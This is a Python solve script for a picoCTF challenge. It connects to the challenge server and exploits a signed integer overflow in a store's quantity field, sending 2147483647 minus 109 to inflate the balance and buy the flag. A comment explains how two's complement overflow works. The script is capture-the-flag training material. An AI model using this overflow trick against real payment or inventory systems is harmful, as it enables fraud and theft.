import socket 
import time

def socket_connect_tcp(IP, PORT):
    print("INFO: connecting")
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((IP, PORT))
            if not sock._closed:
                break
        except:
            pass
    print("INFO: connected")
    return sock

def recieve_data(sock):
    recieve = ""
    t0 = time.time()
    print("INFO: receiving")
    while True:
        try:
            if (time.time() - t0) > 0.3:
                break
            data = sock.recv(1024)
            recieve += data.decode()
        except:
            pass
    print("INFO: recieved")
    print("OUT: \n", recieve)
    return recieve

def send_data(sock, data):
    print("INFO: sending")
    sock.sendall(data.encode('ascii'))
    print("INFO: sent")

def buy_fake(sock):
    raw = recieve_data(s)
    send_data(s, "2\n")
    raw = recieve_data(s)
    send_data(s, "1\n")
    raw = recieve_data(s)
    """
    allocated "int" in C language has at most 4 bytes where the maximum value an integer can have is 2,147,483,647
    C implemented twos complement in signed integers

    thus we can chose a value very close to maximum 4 bytes value,
    doing operations on the value can cause it to exceed the maximum value and the relevant bits get truncated.
    e.g.
    max_length = 4, 2^(4-1) - 1 = 7
     0111 => 7
    +0010 => 2
    in the two complements system this is equal to
    =1001 => -7, where 1 is the signed bit and the value is 110 + 1 => 7.
    however, the correct value should be: 
    =01001 => 9, where 0 is the signed bit and the value is 1001 => 9
    Here this signed bit is overwritten which causes it to be read a completely different number.

    we can exploit this and cause our "new" account_balance to increase on the purchase of the fake flag
    """
    s.sendall(str(2147483647 - 109).encode('ascii'))
    send_data(s, "\n")

def chk_balance(sock):
    raw = recieve_data(s)
    send_data(s, "1\n")

def buy_real(sock):
    raw = recieve_data(s)
    send_data(s, "2\n")
    raw = recieve_data(s)
    send_data(s, "2\n")
    raw = recieve_data(s)
    send_data(s, "1\n")
    raw = recieve_data(s)

if __name__ == '__main__':

    """
    notes: excellent challenge on memory and buffer overflow
    """

    IP = "jupiter.challenges.picoctf.org"
    PORT = 44566
    s = socket_connect_tcp(IP, PORT)

    buy_fake(s)
    chk_balance(s)
    buy_real(s)

    s.close()

